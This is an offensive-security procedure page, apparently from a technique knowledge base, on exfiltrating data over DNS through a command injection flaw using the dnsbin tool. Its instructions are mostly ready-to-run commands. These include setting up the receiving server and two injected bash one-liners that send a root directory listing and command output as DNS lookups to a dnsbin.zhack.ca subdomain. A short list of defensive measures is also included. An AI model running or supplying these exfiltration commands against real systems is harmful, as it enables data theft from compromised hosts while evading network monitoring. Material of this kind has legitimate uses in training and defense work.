---
id: 0e1cedb9-8b3c-446d-9a19-e04af6aa6b2e
name: DNS-Data-Exfiltration-via-Command-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:57.498972+00:00'
updated_at: '2023-04-06T03:55:57.521915+00:00'
tactics:
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exfiltration-Over-Alternative-Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
  - >-
    [[techniques/Command-And-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Command-And-Scripting-Interpreter/T1059.004| T1059.004 - Unix
    Shell]]
sub_techniques: []
tags:
  - '[[tags/Command Injection]]'
  - '[[tags/DNS based data exfiltration]]'
  - exfiltration
  - command-injection
commands:
  - '[[commands/git-clone-dnsbin-repo]]'
  - '[[commands/cd-dnsbin-directory]]'
  - '[[commands/pip-install-dnsbin-requirements]]'
  - '[[commands/python-start-dnsbin-server]]'
  - '[[codes/bash-dns-exfil-ls-root]]'
platforms:
  - Linux
tools:
  - '[[tools/dnsbin]]'
validated: true
---

# DNS-Data-Exfiltration-via-Command-Injection

## Summary

This procedure demonstrates how to exfiltrate data from a compromised Linux system using a command injection vulnerability and DNS queries. By setting up a DNS exfiltration server like dnsbin on the attacker's side, data from the target (such as directory listings or command outputs) is encoded into DNS subdomains and queried to the attacker's server, bypassing typical network filters that allow DNS traffic.

## Description

DNS data exfiltration leverages the fact that DNS traffic is rarely blocked by firewalls. In this scenario, an attacker exploits a command injection vulnerability in a web application or service on the target system to execute shell commands. These commands generate DNS queries where the data to exfiltrate is embedded in the subdomain (e.g., base64-encoded output). The dnsbin tool sets up a disposable DNS server that captures these queries and decodes the data for the attacker. This technique is useful in restricted environments where outbound HTTP/HTTPS is monitored but DNS is not. The target environment is a Linux system with a vulnerable application allowing command injection, and the attacker needs a public DNS server or a service like dnsbin.zhack.ca for receiving data.

## Requirements

1. Access to a public DNS server or hosted instance like dnsbin.zhack.ca to receive exfiltrated data.
2. A command injection vulnerability on the target Linux system allowing arbitrary shell command execution.
3. Attacker machine with Python and Git installed (e.g., Kali Linux).
4. Network access from the target to the attacker's DNS server (UDP port 53 outbound).
5. Basic knowledge of bash scripting for crafting exfiltration commands.

## Defense

- Implement strict input validation and sanitization to prevent command injection (e.g., use prepared statements or whitelisting).
- Monitor DNS traffic for anomalous patterns, such as high-volume queries from internal hosts or unusual subdomains (use tools like Zeek or Suricata).
- Enable DNS logging and filtering at the resolver level to block or alert on exfiltration attempts.
- Deploy DNSSEC to validate queries and prevent spoofing, and restrict outbound DNS to trusted resolvers.

## Objectives

1. Set up a DNS server to capture exfiltrated data without direct network access to the target.
2. Exploit command injection to execute data-gathering commands on the target.
3. Encode and transmit sensitive data (e.g., file listings, command outputs) via DNS queries to bypass security controls.
4. Retrieve and decode the exfiltrated data on the attacker side.

## Instructions

### Step 1: Clone and Set Up dnsbin Server

**Context**: dnsbin is a lightweight DNS server for capturing exfiltration queries. Clone the repository and navigate to the directory to prepare for installation.

**Command** ([[commands/git-clone-dnsbin-repo]]):
```bash
git clone https://github.com/HoLyVieR/dnsbin.git
```

**Command** ([[commands/cd-dnsbin-directory]]):
```bash
cd dnsbin
```

> This clones the dnsbin tool from GitHub and changes into its directory. Expected output for clone is a success message indicating the repository was fetched; cd has no output but confirms the directory change via `pwd`.

### Step 2: Install Dependencies and Start the Server

**Context**: Install Python requirements for dnsbin and launch the server, which will provide a unique subdomain for exfiltration (e.g., xxxx.dnsbin.zhack.ca).

**Command** ([[commands/pip-install-dnsbin-requirements]]):
```bash
pip install -r requirements.txt
```

**Command** ([[commands/python-start-dnsbin-server]]):
```bash
python dnsbin.py
```

> Installation outputs package installation logs; success is indicated by no errors. The server start shows a message with your unique subdomain (e.g., "Your DNS bin is: 3a43c7e4e57a8d0e2057.dnsbin.zhack.ca"). Keep this running to receive queries. Alternatively, use the public instance at http://dnsbin.zhack.ca/ to generate a subdomain without local setup.

### Step 3: Craft and Inject Exfiltration Command via Command Injection

**Context**: Use the command injection vulnerability to run a bash command that lists directories and exfiltrates the output via DNS queries to your subdomain. Replace $_SUBDOMAIN with the unique ID from dnsbin (e.g., 3a43c7e4e57a8d0e2057).

**Command** ([[codes/bash-dns-exfil-ls-root]]):
```bash
for i in $(ls /) ; do host "$i.$_SUBDOMAIN.dnsbin.zhack.ca"; done
```

> Inject this command through the vulnerable input field (e.g., via Burp Suite or direct POST). The command lists root directories (`ls /`), iterates over them, and performs a DNS lookup for each item as a subdomain. dnsbin captures these queries, encoding the directory names for exfiltration. Expected output on target is DNS resolution attempts (may show NXDOMAIN if not configured); success is verified by checking the dnsbin interface for received data.

### Step 4: Verify Exfiltrated Data and Iterate for More Output

**Context**: Monitor the dnsbin web interface or logs for received queries. For more complex data, adapt the command, such as exfiltrating `wget --help` output by processing it into a subdomain-safe format.

**Code** ([[codes/bash-dns-exfil-wget-help]]):
```bash
host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').$_SUBDOMAIN.dnsbin.zhack.ca
```

> This example processes the first line of `wget --help`, replaces spaces/commas with dashes, removes dots, and queries it as a subdomain. Inject similarly via the vulnerability. On the dnsbin side, decode the captured subdomain to retrieve the original output. Success is indicated by the data appearing in the dnsbin dashboard, confirming exfiltration.
